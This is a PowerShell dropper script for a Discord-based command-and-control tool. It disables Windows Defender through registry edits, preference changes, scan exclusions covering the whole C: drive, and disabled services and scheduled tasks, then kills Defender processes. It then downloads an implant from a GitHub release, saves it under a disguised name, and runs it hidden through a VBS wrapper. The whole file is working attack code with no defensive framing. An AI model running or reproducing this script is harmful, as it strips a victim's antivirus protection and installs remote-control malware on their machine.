# DiscordC2 — Defender Disable + Dropper
# Author: IMApurbo
# Host this at: raw.githubusercontent.com/IMApurbo/discordC2/main/disable.ps1

$ErrorActionPreference = 'SilentlyContinue'

# ── disable tamper protection ─────────────────────
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f | Out-Null

# ── disable real time protection ──────────────────
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# ── add exclusions ────────────────────────────────
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath $env:APPDATA
Add-MpPreference -ExclusionPath $env:TEMP
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "wscript.exe"

# ── registry keys ─────────────────────────────────
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f | Out-Null

# ── disable defender scheduled tasks ─────────────
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable | Out-Null
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable | Out-Null
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable | Out-Null
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable | Out-Null

# ── disable defender services via cmd ────────────
# use cmd.exe /c to avoid PowerShell aliasing sc to Set-Content
cmd /c "sc config WinDefend start= disabled"
cmd /c "sc config WdNisSvc start= disabled"
cmd /c "sc config WdFilter start= disabled"
cmd /c "sc config WdBoot start= disabled"
cmd /c "sc config Sense start= disabled"

# ── kill defender ─────────────────────────────────
Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
Stop-Process -Name NisSrv -Force -ErrorAction SilentlyContinue

# ── wait a moment for defender to die ─────────────
Start-Sleep -Seconds 2

# ── download implant ──────────────────────────────
$dest = $env:APPDATA + "\Microsoft\Windows\WinSec.exe"
$url  = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"

$folder = Split-Path $dest
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
} catch {
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
    } catch {
        Start-BitsTransfer -Source $url -Destination $dest
    }
}

# ── verify ────────────────────────────────────────
if (!(Test-Path $dest)) { exit }
if ((Get-Item $dest).Length -lt 100000) { exit }

# ── launch hidden via vbs ─────────────────────────
$vbs = $env:APPDATA + "\Microsoft\Windows\wrun.vbs"
Set-Content -Path $vbs -Value ('Set o = CreateObject("WScript.Shell")' + "`r`n" + 'o.Run Chr(34) & "' + $dest + '" & Chr(34), 0, False')

Start-Process "wscript.exe" -ArgumentList ('//B //Nologo "' + $vbs + '"') -WindowStyle Hidden
